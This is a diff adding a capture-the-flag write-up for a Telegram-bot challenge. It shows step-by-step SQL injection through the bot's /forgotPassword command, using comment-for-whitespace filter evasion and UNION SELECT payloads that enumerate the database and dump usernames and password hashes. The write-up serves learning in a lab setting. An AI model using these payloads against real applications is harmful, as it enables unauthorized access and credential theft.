@@ -711,3 +711,108 @@ But when i try it no luck guess only `eyeager` with the password is the way.
 
 
 Flag:- `CYSEC{itz_all_n1ce&34sy}`
+
+### IAmBot -- 2000 Point
+
+![image](https://user-images.githubusercontent.com/69868171/168629720-12b44e4a-d7ad-45d6-bfb6-e3d7e9959ac1.png)
+
+
+Telegram bot cool let hit it.
+
+![image](https://user-images.githubusercontent.com/69868171/168630054-11435350-038d-4510-a4e3-d1a1f5a1d082.png)
+
+Seems we can register and login but we have no creds let register first to know more about what we are dealing with.
+
+![image](https://user-images.githubusercontent.com/69868171/168630506-0b97531e-edf1-481c-a34c-87345f369a3a.png)
+
+I aready have an account let just log in.
+
+![image](https://user-images.githubusercontent.com/69868171/168630776-d85c9367-1fc0-4449-9bbf-526517a9d4f3.png)
+
+Now that is a jwt token let try checking our profile.
+
+![image](https://user-images.githubusercontent.com/69868171/168630956-d59aabb2-f52d-4ece-a893-a90a72a9064f.png)
+
+Hmmm nothing not that useful let try some injection on the login command.
+
+![image](https://user-images.githubusercontent.com/69868171/168631249-2dd8f3bc-d77c-48fe-aef9-d3f18aead053.png)
+
+Dead end to me ahhhh let check some of the commands.
+
+![image](https://user-images.githubusercontent.com/69868171/168631425-6be6de1a-1fa3-42de-8b7a-d1600ad71209.png)
+
+Let try the `forgotPassword ` command with some simple sql injection payloads.
+
+![image](https://user-images.githubusercontent.com/69868171/168631662-05d0dbb3-a928-49a9-b5e0-44f735f5f12c.png)
+
+That look strange and kind of interesting getting the alert `Hacking attempted detected. This information has been logged and reported to our security team.` is it possible it vulnerable to sql injection.
+
+![image](https://user-images.githubusercontent.com/69868171/168632247-5422348d-35e9-4dc9-ad72-0b61e83d5e2c.png)
+
+Now that is a error i love seeing. Let dig more and see what we can get.
+
+![image](https://user-images.githubusercontent.com/69868171/168633048-3e16ba26-dc88-4115-9213-59af18fcd4ee.png)
+
+I was able to get all users username and hashes but not that useful now i think it time to enumerate the number of columns first to avoid being detected there is an easy bypass, which is to replace all whitespaces with /**/ (comments).
+
+![image](https://user-images.githubusercontent.com/69868171/168634251-902a13c3-7449-4dc9-8507-3db4bf7c117c.png)
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/1# test
+```
+
+![image](https://user-images.githubusercontent.com/69868171/168634528-98c4ea44-25e2-4569-9393-e3246fb33a8b.png)
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/1,2# test
+```
+![image](https://user-images.githubusercontent.com/69868171/168634671-17c73ec4-c413-46a2-a3f3-123111f89bc4.png)
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/1,2,3# test
+```
+Hehehehe no error seems we found the numbers of columns which is 3 now that a lead to move forward. Let confirm the version.
+
+![image](https://user-images.githubusercontent.com/69868171/168635618-d58df8ff-ba6d-4778-99e0-e23c22940156.png)
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/@@version,2,3# test
+```
+
+Now let get the database and tables, columns so we can dump everything.
+
+![image](https://user-images.githubusercontent.com/69868171/168639241-baf95ab1-6d73-4859-aca6-4f7a24c42e04.png)
+
+Database command;- 
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/concat(schema_name),2,3/**/FROM/**/information_schema.schemata# test
+```
+
+![image](https://user-images.githubusercontent.com/69868171/168639720-632592bb-dddd-4679-8666-d4b537bd3084.png)
+
+Tables command;-
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/concat(table_name),2,3/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema='chatbot'# test
+```
+
+![image](https://user-images.githubusercontent.com/69868171/168643048-521eeb81-9733-4217-9aed-25c6923dc9c9.png)
+
+Columns command;-
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/concat(column_name,","),2,3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'# test
+```
+
+Now for the fun part time to dump all XD.
+
+![image](https://user-images.githubusercontent.com/69868171/168644324-a9988698-3de7-45bc-be83-a63d20f47de9.png)
+
+```
+/forgotPassword admin'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/chatbot.users/**/LIMIT/**/2# test
+```
+
+Now that settle it we are done.
+
+Flag: `CYSEC{sQLi_1s_everyWHERe!}` 
+
